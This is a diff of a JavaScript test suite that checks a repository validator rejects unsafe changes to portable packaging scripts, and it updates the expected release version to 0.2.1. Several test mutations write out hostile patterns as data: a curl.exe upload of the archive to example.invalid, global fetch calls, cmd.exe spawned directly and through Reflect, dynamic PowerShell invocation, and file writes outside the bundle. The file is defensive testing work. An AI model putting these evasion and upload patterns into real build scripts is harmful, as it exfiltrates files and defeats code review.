@@ -43,6 +43,27 @@ function syncFakeManifestSeal(fixture) {
   });
 }
 
+function syncPortableSourceSeals(fixture) {
+  const paths = [
+    "scripts/package-portable.mjs",
+    "scripts/compress-portable.ps1",
+  ];
+  replace(join(fixture, "scripts", "validate-repository.mjs"), (source) => {
+    let changed = source;
+    for (const path of paths) {
+      const portableSource = readFileSync(join(fixture, path), "utf8");
+      const hash = normalizedSourceHash(portableSource);
+      const escaped = path.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+      const pattern = new RegExp(
+        `("${escaped}"\\s*,\\s*\\n?\\s*")([a-f0-9]{64})(")`,
+      );
+      assert.match(changed, pattern, `${path} fixture seal was not found`);
+      changed = changed.replace(pattern, `$1${hash}$3`);
+    }
+    return changed;
+  });
+}
+
 function runNegativeFixture(mutate, { fixtureValidator = false } = {}) {
   const fixture = mkdtempSync(join(tmpdir(), "ability-radar-contract-"));
   try {
@@ -83,6 +104,35 @@ function assertRejected(result, expected) {
   assert.match(`${result.stdout}\n${result.stderr}`, expected);
 }
 
+function assertAccepted(result) {
+  assert.equal(
+    result.status,
+    0,
+    `fixture unexpectedly failed:\n${result.stdout}\n${result.stderr}`,
+  );
+}
+
+function runPortableMutation(path, transform) {
+  return runNegativeFixture(
+    (fixture) => {
+      replace(join(fixture, path), transform);
+      syncPortableSourceSeals(fixture);
+    },
+    { fixtureValidator: true },
+  );
+}
+
+test("all first-party manifests require version 0.2.1", () => {
+  const result = runNegativeFixture((fixture) => {
+    replace(join(fixture, "package.json"), (source) => {
+      const manifest = JSON.parse(source);
+      manifest.version = "0.2.0";
+      return `${JSON.stringify(manifest, null, 2)}\n`;
+    });
+  });
+  assertRejected(result, /package\.json version must be 0\.2\.1/i);
+});
+
 test("source start command cannot point to Vite", () => {
   const result = runNegativeFixture((fixture) => {
     replace(join(fixture, "package.json"), (source) => {
@@ -107,30 +157,178 @@ test("portable package command cannot skip the Tauri no-bundle build", () => {
 });
 
 test("portable entry points reject real provider invocations", () => {
-  const result = runNegativeFixture((fixture) => {
-    replace(join(fixture, "scripts", "package-portable.mjs"), (source) =>
-      `${source}\nspawnSync("codex", ["exec", "forbidden"]);\n`,
-    );
-  });
-  assertRejected(result, /portable.*provider invocation/i);
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => `${source}\nspawnSync("codex", ["exec", "forbidden"]);\n`,
+  );
+  assertRejected(result, /portable Node operation allowlist|child process allowlist/i);
 });
 
 test("portable entry points reject network upload commands", () => {
-  const result = runNegativeFixture((fixture) => {
-    replace(join(fixture, "scripts", "compress-portable.ps1"), (source) =>
+  const result = runPortableMutation(
+    "scripts/compress-portable.ps1",
+    (source) =>
       `${source}\ncurl.exe -T $destinationPath https://example.invalid/upload\n`,
-    );
-  });
-  assertRejected(result, /portable.*network upload/i);
+  );
+  assertRejected(result, /portable PowerShell operation allowlist/i);
 });
 
 test("portable entry points reject writes outside the portable bundle", () => {
-  const result = runNegativeFixture((fixture) => {
-    replace(join(fixture, "scripts", "package-portable.mjs"), (source) =>
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) =>
       `${source}\nawait writeFile(join(repoRoot, "escaped.txt"), "forbidden");\n`,
-    );
-  });
-  assertRejected(result, /portable.*writes outside.*target\/release\/bundle\/portable/i);
+  );
+  assertRejected(result, /portable Node operation allowlist/i);
+});
+
+test("portable Node import allowlist rejects an aliased child process", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => source
+      .replace(
+        'import { spawnSync } from "node:child_process";',
+        'import { spawnSync as runPowerShell } from "node:child_process";',
+      )
+      .replace("const result = spawnSync(", "const result = runPowerShell("),
+  );
+  assertRejected(result, /portable Node import allowlist|child process allowlist/i);
+});
+
+test("portable Node child-process allowlist rejects another executable", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => source.replace('"powershell.exe"', '"cmd.exe"'),
+  );
+  assertRejected(result, /portable Node child process allowlist/i);
+});
+
+test("portable PowerShell operation allowlist rejects aliases", () => {
+  const result = runPortableMutation(
+    "scripts/compress-portable.ps1",
+    (source) => source.replace(
+      "Compress-Archive `",
+      "Set-Alias ca Compress-Archive\nca `",
+    ),
+  );
+  assertRejected(result, /portable PowerShell operation allowlist/i);
+});
+
+test("portable PowerShell operation allowlist rejects dynamic invocation", () => {
+  const result = runPortableMutation(
+    "scripts/compress-portable.ps1",
+    (source) => source.replace(
+      "Compress-Archive `",
+      '& ("Compress" + "-Archive") `',
+    ),
+  );
+  assertRejected(result, /portable PowerShell operation allowlist/i);
+});
+
+test("portable Node operation allowlist checks copy destinations", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) =>
+      `${source}\nawait copyFile(executable, join(repoRoot, "escaped.exe"));\n`,
+  );
+  assertRejected(result, /portable Node operation allowlist.*copyFile/i);
+});
+
+test("portable Node import allowlist rejects write streams", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => source
+      .replace(
+        'import { createHash, randomUUID } from "node:crypto";',
+        'import { createHash, randomUUID } from "node:crypto";\nimport { createWriteStream } from "node:fs";',
+      )
+      .concat('\ncreateWriteStream(join(repoRoot, "escaped.zip"));\n'),
+  );
+  assertRejected(result, /portable Node import allowlist|operation allowlist/i);
+});
+
+test("portable Node operation allowlist rejects indirect rename escapes", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) =>
+      `${source}\nawait import("node:fs/promises").then(({ rename }) => rename(stageRoot, repoRoot));\n`,
+  );
+  assertRejected(result, /portable Node import allowlist|operation allowlist/i);
+});
+
+test("portable Node operation allowlist rejects Reflect write escapes", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) =>
+      `${source}\nReflect.apply(writeFile, undefined, [join(repoRoot, "escaped"), "x"]);\n`,
+  );
+  assertRejected(result, /portable Node operation allowlist|indirect/i);
+});
+
+test("portable Node child-process allowlist rejects Reflect execution", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) =>
+      `${source}\nReflect.apply(spawnSync, undefined, ["cmd.exe", ["/c", "exit"]]);\n`,
+  );
+  assertRejected(result, /portable Node child process allowlist|indirect/i);
+});
+
+test("portable Node import allowlist rejects network modules", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => `import "node:https";\n${source}`,
+  );
+  assertRejected(result, /portable Node import allowlist|network/i);
+});
+
+test("portable Node import allowlist rejects computed network APIs", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => `${source}\nglobalThis["fetch"]("https://example.invalid");\n`,
+  );
+  assertRejected(result, /portable Node import allowlist|network|indirect/i);
+});
+
+test("portable PowerShell operation allowlist rejects ScriptBlock creation", () => {
+  const result = runPortableMutation(
+    "scripts/compress-portable.ps1",
+    (source) =>
+      `${source}\n[ScriptBlock]::Create("Compress-Archive").Invoke()\n`,
+  );
+  assertRejected(result, /portable PowerShell operation allowlist/i);
+});
+
+test("portable compressor destination must remain the temporary archive", () => {
+  const result = runPortableMutation(
+    "scripts/package-portable.mjs",
+    (source) => source.replace(
+      '"-Destination",\n        temporaryArchive,',
+      '"-Destination",\n        repoRoot,',
+    ),
+  );
+  assertRejected(result, /portable Node child process allowlist|destination/i);
+});
+
+test("portable semantic checks tolerate harmless comments with reviewed seals", () => {
+  const result = runNegativeFixture(
+    (fixture) => {
+      replace(
+        join(fixture, "scripts", "package-portable.mjs"),
+        (source) => source.replace(
+          'import { createHash } from "node:crypto";',
+          '// Reviewed portable packager.\nimport { createHash } from "node:crypto";',
+        ),
+      );
+      replace(
+        join(fixture, "scripts", "compress-portable.ps1"),
+        (source) => `# Reviewed compressor.\n${source}`,
+      );
+      syncPortableSourceSeals(fixture);
+    },
+    { fixtureValidator: true },
+  );
+  assertAccepted(result);
 });
 
 test("comment-only action cannot satisfy a required workflow action", () => {
@@ -191,15 +389,15 @@ for (const indicator of ["|-", "|+", ">", ">-", ">+", "|2-", ">+2"]) {
   });
 }
 
-test("preview CTA must target the exact v0.2.0 release tag", () => {
+test("preview CTA must target the exact v0.2.1 release tag", () => {
   const result = runNegativeFixture((fixture) => {
     replace(join(fixture, "site", "index.html"), (source) =>
       source.replace(
-        /\/releases\/tag\/v0\.2\.0|\/releases\/latest/g,
+        /\/releases\/tag\/v0\.2\.1|\/releases\/latest/g,
         "/releases/latest",
       ));
   });
-  assertRejected(result, /releases\/tag\/v0\.2\.0|releases\/latest/);
+  assertRejected(result, /releases\/tag\/v0\.2\.1|releases\/latest/);
 });
 
 test("npm license metadata rejects missing resolved and integrity lock provenance", () => {
